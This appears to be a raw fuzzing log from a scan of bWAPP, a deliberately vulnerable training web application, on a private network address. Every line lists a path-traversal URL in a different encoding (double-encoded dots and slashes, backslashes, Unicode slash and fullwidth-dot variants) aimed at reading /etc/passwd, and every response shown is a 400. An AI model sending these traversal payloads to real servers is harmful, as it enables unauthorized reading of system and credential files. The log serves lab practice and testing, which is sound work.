211,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
213,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
208,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66/etc/passwd
210,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66/etc/passwd
209,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66/etc/passwd
217,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
218,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
216,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65//etc/passwd
215,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
214,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
212,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
219,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
231,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
238,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
232,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63/etc/passwd
240,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65//etc/passwd
229,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
236,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
228,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
230,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
234,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63/etc/passwd
235,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
233,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63/etc/passwd
247,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
225,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
223,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
250,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
227,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
224,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66/etc/passwd
243,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
226,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
253,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
237,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
239,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
255,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
222,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
241,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
246,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
242,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
245,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
244,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
248,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%35%63/etc/passwd
251,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
249,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
254,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
220,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
578,400,10L,42W,http://192.168.1.86/bWAPP/..%u2215..%u2215..%u2215/etc/passwd
577,400,10L,42W,http://192.168.1.86/bWAPP/..%u2215..%u2215/etc/passwd
587,400,10L,42W,http://192.168.1.86/bWAPP/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e//etc/passwd
585,400,10L,42W,http://192.168.1.86/bWAPP/%uff0e%uff0e/%uff0e%uff0e//etc/passwd
591,400,10L,42W,http://192.168.1.86/bWAPP/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e//etc/passwd
583,400,10L,42W,http://192.168.1.86/bWAPP/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215/etc/passwd
